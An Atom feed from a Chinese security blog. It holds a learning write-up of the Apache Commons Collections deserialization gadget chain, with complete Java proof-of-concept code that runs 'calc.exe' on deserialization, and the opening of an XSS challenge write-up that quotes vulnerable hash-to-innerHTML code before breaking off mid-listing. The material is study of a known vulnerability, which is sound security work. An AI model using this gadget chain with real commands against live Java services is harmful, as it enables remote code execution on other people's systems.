<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>离怀秋</title>
  
  <subtitle>心未死 战未败</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-05-13T03:28:42.000Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>离怀秋</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Apache Common Collections 反序列化分析学习</title>
    <link href="http://yoursite.com/2020/05/13/Apache-Common-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/"/>
    <id>http://yoursite.com/2020/05/13/Apache-Common-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-05-13T03:11:32.000Z</published>
    <updated>2020-05-13T03:28:42.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>状态有点不好 感觉对什么都提不起来兴趣…希望能快点好吧..</p><h3 id="漏洞组件"><a href="#漏洞组件" class="headerlink" title="漏洞组件"></a>漏洞组件</h3><p>Apache Commons Collections 是一个扩展了Java标准库里的Collection结构的第三方基础库</p><p>漏洞版本&lt;=3.2.1</p><p>起一个maven项目,pom.xml内容如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>2<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>Common-Collections Maven Webapp<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.apache.org<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>Common-Collections<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="漏洞基础利用"><a href="#漏洞基础利用" class="headerlink" title="漏洞基础利用"></a>漏洞基础利用</h4><p>主要漏洞利用点在InvokerTransformer.class的transform方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class cls = input.getClass();</span><br><span class="line">                Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' does not exist"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' cannot be accessed"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var7) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + <span class="keyword">this</span>.iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' threw an exception"</span>, var7);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出传参一个Object，然后通过反射进行任意的方法调用，定位下iMethodName和iParamTypes变量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">    <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">    <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在初始化类的时候进行了变量的定义，所以这些都是我们可控的地方，也就是可以通过InvokerTransformer类进行任意类任意方法的调用。</p><p>但是仅仅这样无法满足java的命令执行，对于PHP而言,只需要简单的system(‘xx’)这样的函数形式即可执行命令，但对于Java来讲命令执行通常为：Runtime.getRuntime().exec(cmd),所以我们必须要进行多次调用，把第一次调用后的结果传给后面一直执行，所以这里是需要多次调用transform方法才可以达到命令执行的目的，所以要找一个可以多次调用transform的函数</p><p>ChainedTransformer.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">        object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造函数会把传进来的对象数组赋值给iTransformers变量，可以看到这里可以通过循环把每一次通过transform得到object作为参数再传给下一次使用，这样就符合了我们之前需要达到的要求.</p><p>看一下简单利用的poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo1</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",</span><br><span class="line">                        new Class[] &#123;String.class, Class[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</span><br><span class="line">                        new Class[] &#123;Object.class, Object[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String<span class="class">.<span class="keyword">class</span> &#125;,</span></span><br><span class="line">                        new Object[] &#123;"calc.exe"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        transformerChain.transform(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里主要解释下对于getMethod的反射为什么是两个class (String.class和class[].class)，翻下getMethod函数的源码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@CallerSensitive</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Method <span class="title">getMethod</span><span class="params">(String name, Class&lt;?&gt;... parameterTypes)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> NoSuchMethodException, SecurityException </span>&#123;</span><br><span class="line">    checkMemberAccess(Member.PUBLIC, Reflection.getCallerClass(), <span class="keyword">true</span>);</span><br><span class="line">    Method method = getMethod0(name, parameterTypes, <span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (method == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchMethodException(getName() + <span class="string">"."</span> + name + argumentTypesToString(parameterTypes));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> method;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到如果需要反射getMethod方法，需要两个参数第一个自然就是String.class，第二个参数是可变数量的泛型class，所以第二个需要传参Class[].class ，同理，invoke也是如此，就不再赘述了。</p><h4 id="进阶反序列化"><a href="#进阶反序列化" class="headerlink" title="进阶反序列化"></a>进阶反序列化</h4><p>上面介绍的只是一些主要的触发点，如果要达到反序列化直接触发的话，还是差一些的，我们需要的是直接通过readObject触发，上面的话还需要再调用一次transform方法，所以需要找到一些调用链来使得tranform自动调用</p><p>LazyMap.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">LazyMap</span><span class="params">(Map map, Transformer factory)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Factory must not be null"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.factory = factory;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">get</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">            Object value = <span class="keyword">this</span>.factory.transform(key);</span><br><span class="line">            <span class="keyword">super</span>.map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.map.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于LazyMap的构造函数，如果第二个参数是Transformer类，则会将这个参数赋值给factory变量给下面的get方法进行使用.</p><p>在LazyMap的get函数中，如果map中不包含传进来的键值的话，则会调用this.factory的transform方法，所以这里可以将factory设置为ChainedTransformer类，这样我们就可以控制factory了，接下来找下get方法的调用</p><p>TiedMapEntry.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.map.get(<span class="keyword">this</span>.key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显可以看出 this.map和我们的lazymap很合适，接着找下getValue的调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getKey() + <span class="string">"="</span> + <span class="keyword">this</span>.getValue();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>java的toString其实是和php一样的，当对象被当作字符串调用时，触发toString</p><p>其实这里如果把反序列化后的对象直接打印出来，确实可以触发，但是还是不算直接触发，这里可以找一个重写过的readObject方法完成这个操作：</p><p>BadAttributeValueExpException.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">   <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">       ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">       Object valObj = gf.get(<span class="string">"val"</span>, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (valObj == <span class="keyword">null</span>) &#123;</span><br><span class="line">           val = <span class="keyword">null</span>;</span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">           val= valObj;</span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="keyword">null</span></span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">           val = valObj.toString();</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">           val = System.identityHashCode(valObj) + <span class="string">"@"</span> + valObj.getClass().getName();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>取出val变量，进行一系列字符串操作，如果我们把这个val变量设置为TiedMapEntry类的话，在程序运行到if(valObj == null)的时候就会触发toString，完成一系列调用,不过这个val变量是私有的，需要通过反射来进行设置变量，最终完整poc如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.HashedMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]&#123; String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123; Object.class, Object[].class&#125;, new Object[]&#123; null ,new Object[0]&#125; ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String<span class="class">.<span class="keyword">class</span> &#125;,</span></span><br><span class="line">                        new Object[] &#123;"calc.exe"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"lih3iu"</span>);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException ins = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        Field valfield = ins.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        valfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valfield.set(ins, entry);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream exp = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(exp);</span><br><span class="line">        oos.writeObject(ins);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream out = <span class="keyword">new</span> ByteArrayInputStream(exp.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(out);</span><br><span class="line">        Object obj = (Object) ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h4><ul><li>通过取出val中的TiedMapEntry</li><li>触发toString函数</li><li>触发getValue函数</li><li>触发<code>this.map.get(this.key)</code> Map类为lazymap,key随意</li><li>触发this.factory.transform(key)，factory为ChainedTransformer类</li><li>最终执行命令</li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.smi1e.top/java反序列化学习之apache-commons-collections/" target="_blank" rel="noopener">https://www.smi1e.top/java%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%ad%a6%e4%b9%a0%e4%b9%8bapache-commons-collections/</a></p><p><a href="https://xz.aliyun.com/t/4711" target="_blank" rel="noopener">https://xz.aliyun.com/t/4711</a></p><p><a href="https://xz.aliyun.com/t/4558#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/4558#toc-0</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;状态有点不好 感觉对什么都提不起来兴趣…希望能快点好吧..&lt;/p&gt;
&lt;h3 id=&quot;漏洞组件&quot;&gt;&lt;a href=&quot;#漏洞组件&quot; class=
      
    
    </summary>
    
    
    
      <category term="Web安全" scheme="http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>intigriti Easter XSS challenge</title>
    <link href="http://yoursite.com/2020/05/12/intigriti-Easter-XSS-challenge/"/>
    <id>http://yoursite.com/2020/05/12/intigriti-Easter-XSS-challenge/</id>
    <published>2020-05-12T01:31:23.000Z</published>
    <updated>2020-05-12T01:32:10.000Z</updated>
    
    <content type="html"><![CDATA[<p>文章首发于先知</p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>国外的一个xss challenge(规定时间内做出可得一年的Burp Suite正版证书)</p><p><img src="https://s1.ax1x.com/2020/04/22/JY7U10.png" alt="JY7U10.png"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>主要的功能逻辑代码为script.js, 如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> hash = <span class="built_in">document</span>.location.hash.substr(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(hash)&#123;</span><br><span class="line">  displayReason(hash);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"reasons"</span>).onchange = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(e.target.value != <span class="string">""</span>)</span><br><span class="line">    displayReason(e.target.value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reasonLoaded</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> reason = <span class="built_in">document</span>.getElementById(<span class="string">"reason"</span>);</span><br><span class="line">    reason.innerHTML = <span class="built_in">unescape</span>(<span class="keyword">this</span>.responseText);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">displayReason</span>(<span class="params">reason</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">window</span>.location.hash = reason;</span><br><span class="line">  <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">  xhr.addEventListener(<span class="string">"load"</span>, reasonLoaded);</span><br><span class="line">  xhr.open(<span class="string">"GET"</span>,<span class="string">`./reasons/<span class="subst">$&#123;reason&#125;</span>.txt`</span>);</span><br><span class="line">  xhr.send();</span><br><span 